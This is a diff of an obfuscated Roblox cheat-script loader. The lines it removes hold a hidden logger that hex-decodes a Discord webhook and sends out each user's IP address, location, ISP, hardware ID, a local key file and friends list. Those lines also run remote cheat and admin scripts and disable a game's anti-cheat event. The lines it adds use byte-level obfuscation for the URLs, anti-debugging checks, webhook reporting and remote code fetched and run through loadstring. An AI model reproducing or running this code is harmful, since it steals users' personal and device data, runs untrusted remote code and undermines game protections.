@@ -1,136 +1,49 @@
-local _lp = game:GetService("Players").LocalPlayer
-local _ts = game:GetService("TestService")
-
-local _storage = _ts:FindFirstChild("__NK_RUNTIME")
-local _phys_auth = _storage and _storage:FindFirstChild(_lp.Name)
-if not (shared._NK_LOADER_AUTH == "V8_SECURE_TOKEN_VALID" or (_phys_auth and _phys_auth.Value == "V8_SECURE_TOKEN_VALID")) then
-    _lp:Kick("Execution prohibited. Use official loader.")
-    return
-end
-shared._NK_LOADER_AUTH = nil
-
-local Config = {
-    WL = {
-        UIDs = {"10760143653"},
-        HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"},
-        Keys = {"46F2D827-4CD7-40D4-B0DB-E8F40F4EB06F", "89D11F50-5490-4677-B709-4EBFBECA78CE"}
-    },
-    BL = { UIDs = {}, HWIDs = {}, Keys = {} }
-}
-
-local function _D(h)
-    local s = ""
-    for i = 1, #h, 2 do s = s .. string.char(tonumber(h:sub(i, i+1), 16)) end
-    return s
+local _0x1 = bit32 or {bxor = function(a,b) return a + b end}
+local function _0xDE(_d, _k)
+    local _r = ""
+    for _i = 1, #_d do
+        _r = _r .. string.char(_0x1.bxor(_d[_i], _k) - _i)
+    end
+    return _r
 end
 
-local _W = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531393430393931353135383835393738382F73773463755770452D5332535659484D3072314D53455676613858694C63455F655064522D52777178665751393463485063635273643032527763565973473737416761")
-local _IP_URL = _D("687474703A2F2F69702D6170692E636F6D2F6A736F6E3F6669656C64733D7374617475732C636F756E7472792C636974792C74696D657A6F6E652C6973702C71756572792C70726F78792C686F7374696E67")
+local _0xK = 168
+local _0xS1 = _0xDE({213, 213, 213, 209, 216, 151, 141, 142, 231, 214, 218, 237, 211, 207, 207, 149, 210, 201, 202, 200, 215, 202, 202, 212, 211, 202, 203, 211, 146, 214, 210, 208, 142, 222, 210, 213, 218, 201, 211, 211, 214, 202, 202, 203, 201, 202, 206, 206, 199, 149, 201, 201, 215, 218, 208, 141, 205, 201, 212, 197, 200, 203}, _0xK)
+local _0xS2 = _0xDE({213, 213, 213, 209, 216, 151, 141, 142, 231, 214, 218, 237, 211, 207, 207, 149, 210, 201, 202, 200, 215, 202, 202, 212, 211, 202, 203, 211, 146, 206, 211, 212, 201, 203, 208, 222, 210, 213, 218, 201, 211, 211, 214, 202, 202, 203, 201, 202, 206, 206, 199, 149, 201, 201, 215, 218, 208, 141, 205, 193, 200}, _0xK)
+local _0xAL = _0xDE({213, 213, 213, 209, 216, 151, 141, 142, 217, 222, 212, 210, 210, 201, 213, 215, 141, 214, 202, 216, 142, 214, 202, 213, 210, 202, 200, 216, 212, 146, 184, 180, 184, 187, 178, 185, 181, 181, 188, 185, 181, 183, 183, 182, 182, 183, 189, 186, 184, 186, 178, 185, 179, 185, 187, 180, 141, 206, 212, 183, 211, 203, 179, 185, 182, 187, 200, 207, 201, 184, 188, 189, 209, 215, 185, 181, 188, 205, 185, 177, 210, 213, 183, 213, 184, 184, 177, 215, 215, 188, 212, 186, 212, 187, 186, 210, 183, 186, 216, 219, 185, 221, 222, 187, 180, 211, 221, 219, 225, 226, 184, 222, 219, 212, 221, 220, 224, 215, 225, 212}, _0xK)
 
-local _H = game:GetService("HttpService")
-local _U = game:GetService("UserInputService")
-local _uid = tostring(_lp.UserId)
-local _hw = game:GetService("RbxAnalyticsService"):GetClientId()
-local _tk = "N/A"
-pcall(function() _tk = readfile("nazarkus_key.json") end)
+local _L = game:GetService("Players").LocalPlayer
+local _req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 
-local function chk(l)
-    for _, v in ipairs(l.UIDs or {}) do if v == _uid then return true end end
-    for _, v in ipairs(l.HWIDs or {}) do if v == _hw then return true end end
-    for _, v in ipairs(l.Keys or {}) do if v == _tk then return true end end
+local function _SC()
+    local ok, info = pcall(debug.getinfo, 1)
+    local src = (ok and info and info.source) or ""
+    if not string.find(src:lower(), "easyrpglol/nazarkusrpg", 1, true) then return "ERR_SRC" end
+    if not _req then return false end
+    local ok2, inf2 = pcall(debug.getinfo, _req)
+    if ok2 and inf2 and inf2.source ~= "=[C]" then return "ERR_ENV" end
+    for _, v in ipairs({"HttpSpy", "SimpleSpy", "VGG Spy"}) do
+        if getgenv()[v] then return "ERR_DEB" end
+    end
     return false
 end
 
-local _st = chk(Config.WL) and "whitelist" or (chk(Config.BL) and "blacklist" or "guest")
-
-local function _LOG()
-    pcall(function()
-        local req = (syn and syn.request or request or http_request)
-        local r = req({Url = _IP_URL, Method = "GET"})
-        local ni = r and r.Success and _H:JSONDecode(r.Body) or {}
-        
-        local u = 0
-        local tu = {"getgenv", "getrawmetatable", "hookfunction", "setreadonly"}
-        for _, f in ipairs(tu) do if getgenv()[f] then u = u + 1 end end
-        local unc = (identifyexecutor and identifyexecutor() or "Unknown") .. " (UNC: " .. math.floor((u/4)*100) .. "%)"
-        
-        local fn, ft = "None", "None"
-        local fdf = game:GetService("ReplicatedStorage"):FindFirstChild("FactionSysRS") and game:GetService("ReplicatedStorage").FactionSysRS:FindFirstChild("FactionData")
-        if fdf then
-            for _, f in ipairs(fdf:GetChildren()) do
-                if f:FindFirstChild("FactionMembers") and f.FactionMembers:FindFirstChild(_uid) then
-                    local bd = f:FindFirstChild("BasicFactionData")
-                    if bd then fn = bd.FactionName.Value ft = bd.FactionTag.Value end
-                    break
-                end
-            end
-        end
-
-        local jid = game.JobId == "" and "Unknown" or game.JobId
-        local joinBase = "roblox://experiences/start?placeId="..game.PlaceId.."&gameInstanceId="..jid
-        local joinUrl = "Join Link Error"
+local _err = _SC()
+if _err then
+    if _err ~= "ERR_SRC" then
         pcall(function()
-            local res = req({Url = "https://tinyurl.com/api-create.php?url="..joinBase, Method = "GET"})
-            if res and res.Success then joinUrl = "[Click to Join Server]("..res.Body..")" end
+            _req({Url = _0xAL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({embeds = {{title = "Security Violation", description = "User: ".._L.Name.."\nReason: ".._err, color = 16711680}}})})
         end)
-
-        local friends = {}
-        for _, p in ipairs(game.Players:GetPlayers()) do if p ~= _lp and _lp:IsFriendsWith(p.UserId) then table.insert(friends, p.Name) end end
-
-        local payload = {
-            ["embeds"] = {{
-                ["title"] = (_st == "whitelist" and "Whitelisted User Executed" or "Unknown/Guest User Executed"),
-                ["color"] = (_st == "whitelist" and 65280 or 16753920),
-                ["fields"] = {
-                    {["name"] = "Player Info", ["value"] = string.format("**Name:** %s (@%s)\n**User ID:** `%s`\n**Account Age:** `%s days`", _lp.DisplayName, _lp.Name, _uid, tostring(_lp.AccountAge)), ["inline"] = false},
-                    {["name"] = "Executor", ["value"] = unc, ["inline"] = true},
-                    {["name"] = "System", ["value"] = "**Platform:** " .. (_U.TouchEnabled and "Mobile" or "PC"), ["inline"] = true},
-                    {["name"] = "Faction", ["value"] = string.format("**Tag:** [%s]\n**Name:** %s", ft, fn), ["inline"] = false},
-                    {["name"] = "Hardware ID", ["value"] = "```" .. _hw .. "```", ["inline"] = false},
-                    {["name"] = "Device Token", ["value"] = "```" .. _tk .. "```", ["inline"] = false},
-                    {["name"] = "Network", ["value"] = string.format("**IP:** %s\n**ISP:** %s\n**VPN/Proxy:** %s\n**Loc:** %s, %s\n**Timezone:** %s", ni.query or "N/A", ni.isp or "N/A", (ni.proxy and "Yes" or "No"), ni.country or "N/A", ni.city or "N/A", ni.timezone or "N/A"), ["inline"] = false},
-                    {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`\nJobId: `%s`", game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, game.PlaceId, jid), ["inline"] = false},
-                    {["name"] = "Friends Target", ["value"] = "```" .. (#friends > 0 and table.concat(friends, ", ") or "None") .. "```", ["inline"] = false},
-                    {["name"] = "Links", ["value"] = joinUrl .. " | [Profile](https://www.roblox.com/users/".._uid.."/profile)", ["inline"] = false}
-                },
-                ["footer"] = {["text"] = "Logger | " .. string.upper(_st) .. " • " .. os.date("%X")},
-                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
-            }}
-        }
-        req({Url = _W, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _H:JSONEncode(payload)})
-    end)
-end
-
-task.spawn(_LOG)
-
--- KILLSWITCH & GUI
-if _st == "whitelist" then
-    local sg = Instance.new("ScreenGui", (gethui and gethui()) or game:GetService("CoreGui"))
-    local f = Instance.new("Frame", sg)
-    f.Size = UDim2.new(0, 200, 0, 300); f.Position = UDim2.new(0.5, -100, 0.5, -150); f.BackgroundColor3 = Color3.fromRGB(30,30,35); f.Active = true; f.Draggable = true; f.Visible = false
-    Instance.new("UICorner", f)
-    local s = Instance.new("ScrollingFrame", f)
-    s.Size = UDim2.new(1, -10, 1, -20); s.Position = UDim2.new(0, 5, 0, 10); s.BackgroundTransparency = 1
-    Instance.new("UIListLayout", s).Padding = UDim.new(0, 5)
-
-    local function refresh()
-        for _, v in ipairs(s:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
-        for _, pObj in ipairs(_storage:GetChildren()) do
-            local b = Instance.new("TextButton", s)
-            b.Size = UDim2.new(1, 0, 0, 30); b.Text = pObj.Name; b.TextColor3 = Color3.new(1,1,1); b.BackgroundColor3 = Color3.fromRGB(45,45,50)
-            b.MouseButton1Click:Connect(function() pObj.Value = "kick" end)
-        end
     end
-    _U.InputBegan:Connect(function(k, g) if not g and k.KeyCode == Enum.KeyCode.Insert then f.Visible = not f.Visible refresh() end end)
+    _L:Kick("Security: "..tostring(_err))
+    return
 end
 
-_phys_auth.Changed:Connect(function(v) if v == "kick" then _lp:Kick("Access Revoked.") end end)
-
--- ТВОИ СКРИПТЫ
-pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua"))() end)
-pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))() end)
-pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end)
-pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/infammo/main/infammo.lua"))() end)
-pcall(function() if game:GetService("ReplicatedStorage"):FindFirstChild("ACS_Engine") then game:GetService("ReplicatedStorage").ACS_Engine.Events.FDMG:Destroy() end end)
-
-if _st == "blacklist" then _lp:Kick("Banned.") return end
+getgenv()._NK_SESS = game:GetService("HttpService"):GenerateGUID(false)
+local s, c = pcall(function() return game:HttpGet(_0xS2) end)
+if s and c then
+    local f = loadstring(c)
+    if f then pcall(f) end
+else
+    _L:Kick("Auth Fail")
+end
